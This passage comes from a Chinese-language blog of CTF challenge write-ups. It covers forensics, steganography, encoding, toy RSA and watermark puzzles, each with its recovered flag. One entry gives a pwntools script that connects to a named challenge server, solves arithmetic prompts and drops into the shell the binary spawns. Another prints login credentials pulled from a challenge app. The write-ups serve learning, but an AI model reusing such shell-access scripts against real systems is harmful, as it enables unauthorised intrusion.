class="string">&quot;alerionMascot@CFIUL.com:HappyFirstYear&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>很容易发现这个 APP 实现了登录并且登录上去就会显示 flag。既然账号密码都已经拿到了，不妨安装一下并登录。然而登录上去了也没 flag。但是代码的实现逻辑确实是这样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="comment">// android.support.v7.app.AppCompatActivity, android.support.v4.app.SupportActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(<span class="meta">@Nullable</span> Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_information);</span><br><span class="line">        <span class="keyword">if</span> (getIntent().getBooleanExtra(IS_ADMIN, <span class="keyword">false</span>)) &#123;</span><br><span class="line">            showLoginFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因此我去查了 WriteUp，其中描述如下。</p><blockquote><p>With a internet connection, the flag will appear under the CFI logo.</p></blockquote><p>Fine，那么这题的 flag 可能出了点问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFI&#123;DOUMMY_creeeeeddddd_issSoFriENDlieee_QUACKKKK&#125;</span><br></pre></td></tr></table></figure><h3 id="watevrCTF-2019-Polly"><a href="#watevrCTF-2019-Polly" class="headerlink" title="[watevrCTF 2019]Polly"></a>[watevrCTF 2019]Polly</h3><p>附件给出的是一个方程，推测其 x 为不同取值时可以求得 flag。因此写出如下代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CalculateX</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="comment"># 这里写方程，太长了就不贴了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(CalculateX(i)))</span><br></pre></td></tr></table></figure><p>需要注意的是，因为方程数字太大了，需要使用 sagemath 才能算出准确结果。算出前 100 位可知其中含有 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watevr&#123;polly_polynomials_youtube.com&#x2F;watch?v&#x3D;THNWVVn9JO0&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-thekey"><a href="#BSidesSF2019-thekey" class="headerlink" title="[BSidesSF2019]thekey"></a>[BSidesSF2019]thekey</h3><p>简单的键盘流量分析， Leftover Capture Data 提取出来再使用 USB Keyboard Data Hacker 跑一下可得如下内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] Found : viim&lt;SPACE&gt;flaag.ttxt&lt;RET&gt;iTthe&lt;SPACE&gt;flaag&lt;SPACE&gt;is&lt;SPACE&gt;ctf&lt;ESC&gt;vbUuA&#123;[my_favoritte_editor_is_vim&#125;&lt;ESC&gt;hhhhhhhhhhhhhhhhhhhau&lt;ESC&gt;vi&#123;U&lt;ESC&gt;&quot;;wq&lt;RET&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf&#123;MY_FAVOURITE_EDITOR_IS_VIM&#125;</span><br></pre></td></tr></table></figure><h3 id="watevrCTF-2019-Unspaellablle"><a href="#watevrCTF-2019-Unspaellablle" class="headerlink" title="[watevrCTF 2019]Unspaellablle"></a>[watevrCTF 2019]Unspaellablle</h3><p>附件给出了一份脚本，稍微找一下可以发现其原本的脚本。</p><blockquote><p><a href="https://imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html">https://imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html</a></p></blockquote><p>将两份脚本使用 CyberChef 进行比较即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617531493659.3f5fc9a3d635634d696e0d102426afa74dc34fed.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watevr&#123;icantspeel_tiny.cc&#x2F;2qtdez&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2017-remote-multimedia-controller"><a href="#INSHack2017-remote-multimedia-controller" class="headerlink" title="[INSHack2017]remote-multimedia-controller"></a>[INSHack2017]remote-multimedia-controller</h3><p>附件解压之后得到一个流量包，使用 Wireshark 跟踪到 TCP 流 2 可得一串 base64 字符串。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617531815294.0944ebc199ad8e033b56fa227d15d4710ac93c04.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vmxkd1NrNVhVbk5qUlZKU1ltdGFjRlJYZEhOaWJFNVhWR3RPV0dKVmJEWldiR1JyV1ZkS1ZXRXphRnBpVkVaVFYycEtVMU5IUmtobFJYQlRUVmhDTmxZeFdtdGhhelZ5WWtWYWFWSlViRmRVVlZaYVRURmFjbFpyT1ZaV2JXUTJWa1pvYTFkck1YVlVhbHBoVWxack1GUlZaRXRqVmxaMVZHMTRXRkpVUlRCWFdIQkdUbGRHY2s1VmFFOVdNWEJoV1Zkek1XSldaSFJPVm1SclZsZDRXbFJWVm5wUVVUMDk&#x3D;</span><br></pre></td></tr></table></figure><p>使用 CyberChef 套娃解码后可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good job ! You found the flag: INSA&#123;TCP_s0ck3t_4n4lys1s_c4n_b3_fun!&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;TCP_s0ck3t_4n4lys1s_c4n_b3_fun!&#125;</span><br></pre></td></tr></table></figure><h3 id="GWCTF2019-math"><a href="#GWCTF2019-math" class="headerlink" title="[GWCTF2019]math"></a>[GWCTF2019]math</h3><p>附件给出的是一个 ELF 文件，使用 IDA 查看可以发现如下逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Pass 150 levels and i will give you the flag~&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;====================================================&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now level %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v9);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Math problem: %d * %d - %d + %d = ??? &quot;</span>, v4, v5, v6, v7);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Give me your answer:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x80</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)strtol(&amp;buf, <span class="number">0LL</span>, <span class="number">0xA</span>) != v5 * v4 - v6 + v7 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again?&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Right! Continue~&quot;</span>);</span><br><span class="line">++v9;</span><br><span class="line">sleep((<span class="keyword">unsigned</span> __int64)<span class="string">&quot;Right! Continue~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v9 &lt;= <span class="number">0x95</span> );</span><br><span class="line">  <span class="keyword">if</span> ( v9 != <span class="number">0x96</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Congratulation!&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>因此需要连续计算正确 150 次计算题，而且需要与远程交互。因此用 pwntools 来写脚本实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">process = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26631</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    process.recvuntil(<span class="string">&#x27;Math problem: &#x27;</span>)</span><br><span class="line">    expression = process.recvuntil(<span class="string">&#x27;=&#x27;</span>).decode().replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    expression = expression.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    expression = expression.translate(<span class="built_in">str</span>.maketrans(<span class="string">&quot;+-*/&quot;</span>, <span class="string">&quot;    &quot;</span>))</span><br><span class="line">    expression = expression.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(expression))</span><br><span class="line">    process.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(expression[<span class="number">0</span>]) * <span class="built_in">int</span>(expression[<span class="number">1</span>]) - <span class="built_in">int</span>(expression[<span class="number">2</span>]) + <span class="built_in">int</span>(expression[<span class="number">3</span>])))</span><br><span class="line">process.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0e6a2af0-83e3-4fce-8535-a5bfd4c4cca9&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-Spreadshit"><a href="#INSHack2018-Spreadshit" class="headerlink" title="[INSHack2018]Spreadshit"></a>[INSHack2018]Spreadshit</h3><p>附件中给出了一个 ods 文件，将其使用 Excel 打开，查找并选中全部空格可得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617533032620.594e9b72117b159171e3f5e483ffbc3b612c5979.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;3cf6463910edffb0&#125;</span><br></pre></td></tr></table></figure><h3 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h3><p>题目给出的附件有如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</span><br></pre></td></tr></table></figure><p>尝试用 CyberChef 的 <code>From Hex</code> 解码，得到了不可读的字符串，考虑到字符串本身可能经过了运算。猜测最后一个字符 <code>0xfd</code> 应该与 flag 的结尾也就是 <code>&#125;</code> 字符相对应，也就是原本应该是 <code>0x7d</code>。因此尝试将此前得到的结果减去 <code>0x80</code>，得到了如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipe&#x3D;From_Hex(&#39;None&#39;)SUB(%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;0x80&#39;%7D)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h3><p>可以在附件给出的代码中的 index.html 中找到如下内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===&quot;</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 Base32 解码字符串后得到了假 flag <code>suctf&#123;hAHaha_Fak3_F1ag&#125;</code>，于是将分析转向图片。使用 StegSolve 可解得图片中包含的隐写内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617951898429.a16261b648a2027994036e9a6bbdb1f18e7354eb.png"></p><p>将其提取出来可以得到如下内容，推测其是 AES 加密之后的密文。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To&#x2F;KeuHg8vKAxFrVQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>使用之前得到的假 flag 作为 key 对密文进行 Triple DES 解密可得真正的 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617952553631.29833ec1ff22a56cdedf21d6707ef9f8cc6ba3dc.png" alt="image-20210409151553062"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf&#123;U_F0und_1t&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-虚假的压缩包"><a href="#GUET-CTF2019-虚假的压缩包" class="headerlink" title="[GUET-CTF2019]虚假的压缩包"></a>[GUET-CTF2019]虚假的压缩包</h3><p>解压附件得到真实的压缩包和虚假的压缩包。虚假的压缩包是伪加密，将其 deFlags 修改成 0 即可解压其中的文件，得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数学题</span><br><span class="line">n &#x3D; 33</span><br><span class="line">e &#x3D; 3</span><br><span class="line">解26</span><br><span class="line"></span><br><span class="line">-------------------------</span><br><span class="line">答案是</span><br></pre></td></tr></table></figure><p>很容易看出这是简单的 RSA。将 $n$ 分解为 $11 \times 3$ 可得其欧拉值为 $\rho{(n)} = (11 - 1) \times (3 - 1) = 20$，$d \times e \mod  20 \equiv 1$，算得 $d = 7.$ <code>pow(c,d,n) = pow(26,7,33) = 5</code>。因此得到了 <code>答案是5</code>。将其作为压缩包密码解压真实的压缩包。</p><p>解压得到了一张图片和一段文本。使用 010 editor 打开图片并运行 PNG 模板可以发现爆出了熟悉的 CRC Mismatch。尝试使用图片宽高爆破脚本修正宽高为 <code>(&#39;hex:&#39;, &#39;0xc6&#39;, &#39;0xf2&#39;)</code>，得到了如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617956195657.6508ef9faa1c65a9fc51d3d8a75b511f602ad1f6.png"></p><p>此时可知需要将得到的文本亦或 5，写个脚本来实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="built_in">open</span>(<span class="string">&quot;亦真亦假&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">result = <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">[result.write(<span class="built_in">hex</span>(<span class="built_in">int</span>(i, <span class="number">16</span>) ^ <span class="number">5</span>)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> text]</span><br></pre></td></tr></table></figure><p>使用脚本将文件中的内容处理过后再将得到的内容 <code>From Hex</code> 解码一次可以得到一个 Word 文档。将其打开后可以在文章末尾发现超出文本的红色波浪线。因此尝试将超出的部分的字体颜色调深，此时可以得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1617957812594.6e4ccd1e34330549961c4b6999ee0611377ca96d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;_th2_7ru8_2iP_&#125;</span><br></pre></td></tr></table></figure><h3 id="蜘蛛侠呀"><a href="#蜘蛛侠呀" class="headerlink" title="蜘蛛侠呀"></a>蜘蛛侠呀</h3><blockquote><p>将你获得的明显信息md5加密之后以flag{xxx}的格式提交。</p></blockquote><p>Wireshark 分析附件给出的流量包，跟踪 TCP 流 1 可以发现一个 <code>GET /no_flag.zip</code> 响应为 304 的请求。再分析 ICMP 协议的流量，可以发现其中包含着数据。使用 tshark <code>tshark -r .\out.pcap -T fields -e data &gt; data.txt </code> 将其中的数据提取出来。将提取得到的数据简单处理后用 CyberChef 通过 <code>Unique --&gt; From Hex</code> 后可以得到一个以 <code>$$START$$-----BEGIN CERTIFICATE-----</code> 开头的文件。将 <code>$$START$$</code> 去除掉之后再将证书格式以及换行去掉后解 Base64 编码，可得一个压缩文档。解压之后可得一个十分卡顿的 GIF 图片，猜测含有时间隐写。</p><p><img src="https://butter.lumosary.workers.dev/images/album/4df72543-170c-4dff-a021-5bc0cff9f636/1617986423582.528f41484ec1ecfecc3ba41bc4c244514ad46067.gif"></p><p>使用 <code>ImageMagick identify</code> 工具执行 <code>identify -verbose .\flag.gif </code> 并将结果整理后可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20 50 50 20 50 50 20 50 20 50 20 20 20 50 20 20 20 20 50 50 20 50 20 50 20 50 20 50 50 50 50 50 20 20 50 50 20 20 20 50 20 50 50 50 20 50 20 20 66 66</span><br></pre></td></tr></table></figure><p>将最后的两个 <code>66</code> 去除，将 <code>20</code> 替换成 0，<code>50</code> 替换成 1。再二进制转字符串可得到 <code>mD5_1t</code>。将其 MD5 一次可以得到 <code>f0f1003afe4ae8ce4aa8e8487a8ab3b6</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f0f1003afe4ae8ce4aa8e8487a8ab3b6&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2017-10-cl0v3rf13ld-lane-signal"><a href="#INSHack2017-10-cl0v3rf13ld-lane-signal" class="headerlink" title="[INSHack2017]10-cl0v3rf13ld-lane-signal"></a>[INSHack2017]10-cl0v3rf13ld-lane-signal</h3><p>修正所得附件的文件拓展名为 JPG，运行 010 editor 的模板可以很容易看到文件末尾有另外一张 PNG 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125315933.30c582c581d25d6803d4db40d46414761be08a2c.png"></p><p>将 PNG 文件提取出来得到下图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125452952.e5e59e90f471a44b4feeef64916213d8591aee6a.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125486724.31cb9ea5717ed0e1c64e0135589a7144a02715bb.png" alt="image-20210411151806582"></p><p>在其左下角可以发现小红点，使用摩斯电码解码可得 <code>HELPME</code>。同时在图片的末尾还能发现一个音频文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618125682663.bc55fd1e1089fc806caa7e75db378b3ac9c87bc5.png"></p><p>将音频文件提取出来，使用 Audition 打开，可以发现明显的摩斯电码的痕迹，将其抄收下来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618126304818.1ae93647f541cffaa6a7baebcdf7a0f7a49e71e5.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.. -. ... .- -.--. -- ----- .-. ..... ...-- ..--.- .-- .---- .-.. .-.. ..--.- -. ...-- ...- ...-- .-. ..--.- ....- --. ...-- -.-.-- -.--.-</span><br></pre></td></tr></table></figure><p>转码后整理即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;M0R53_W1LL_N3V3R_4G3!&#125;</span><br></pre></td></tr></table></figure><h3 id="GWCTF2019-huyao"><a href="#GWCTF2019-huyao" class="headerlink" title="[GWCTF2019]huyao"></a>[GWCTF2019]huyao</h3><p>附件给出了两张图，猜测是盲水印。在网上找到一段可解出的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line">ALPHA = <span class="number">5</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_parser</span>():</span></span><br><span class="line">    parser = ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--original&#x27;</span>, dest=<span class="string">&#x27;ori&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--image&#x27;</span>, dest=<span class="string">&#x27;img&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--result&#x27;</span>, dest=<span class="string">&#x27;res&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--alpha&#x27;</span>, dest=<span class="string">&#x27;alpha&#x27;</span>, default=ALPHA)</span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = build_parser()</span><br><span class="line">    options = parser.parse_args()</span><br><span class="line">    ori = options.ori</span><br><span class="line">    img = options.img</span><br><span class="line">    res = options.res</span><br><span class="line">    alpha = options.alpha</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(ori):</span><br><span class="line">        parser.error(<span class="string">&quot;original image %s does not exist.&quot;</span> % ori)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(img):</span><br><span class="line">        parser.error(<span class="string">&quot;image %s does not exist.&quot;</span> % img)</span><br><span class="line">    decode(ori, img, res, alpha)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">ori_path, img_path, res_path, alpha</span>):</span></span><br><span class="line">    ori = cv2.imread(ori_path)</span><br><span class="line">    img = cv2.imread(img_path)</span><br><span class="line">    ori_f = np.fft.fft2(ori)</span><br><span class="line">    img_f = np.fft.fft2(img)</span><br><span class="line">    height, width = ori.shape[<span class="number">0</span>], ori.shape[<span class="number">1</span>]</span><br><span class="line">    watermark = (ori_f - img_f) / alpha</span><br><span class="line">    watermark = np.real(watermark)</span><br><span class="line">    res = np.zeros(watermark.shape)</span><br><span class="line">    random.seed(height + width)</span><br><span class="line">    x = <span class="built_in">range</span>(height / <span class="number">2</span>)</span><br><span class="line">    y = <span class="built_in">range</span>(width)</span><br><span class="line">    random.shuffle(x)</span><br><span class="line">    random.shuffle(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height / <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            res[x[i]][y[j]] = watermark[i][j]</span><br><span class="line">    cv2.imwrite(res_path, res, [<span class="built_in">int</span>(cv2.IMWRITE_JPEG_QUALITY), <span class="number">100</span>])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>使用 <code>python2 bwm.py --original huyao.png --image stillhuyao.png --result result.png</code> 可以提取出一张水印图，因此得到了 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618158119719.be262706bb8401ebe9d381f21def113d089ca311.png@270h_300w_1c"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWHT&#123;BWM_1s_c00l&#125;</span><br></pre></td></tr></table></figure><h3 id="我爱Linux"><a href="#我爱Linux" class="headerlink" title="我爱Linux"></a>我爱Linux</h3><p>附件给出的是一张图片。在其末尾可以得到一串二进制数据。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618491407832.94cc2c15890475c424c7921d58468849a9bab35d.png"></p><p>使用 <code>print(pickle.loads(open(&quot;extract.bin&quot;, &quot;rb&quot;).read()))</code> 处理一下得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[(3, &#39;m&#39;), (4, &#39;&quot;&#39;), (5, &#39;&quot;&#39;), (8, &#39;&quot;&#39;), (9, &#39;&quot;&#39;), (10, &#39;#&#39;), (31, &#39;m&#39;), (32, &#39;&quot;&#39;), (33, &#39;&quot;&#39;), (44, &#39;m&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;m&#39;), (50, &#39;m&#39;), (51, &#39;m&#39;), (52, &#39;m&#39;), (53, &#39;m&#39;), (54, &#39;m&#39;), (55, &#39;m&#39;), (58, &#39;m&#39;), (59, &#39;m&#39;), (60, 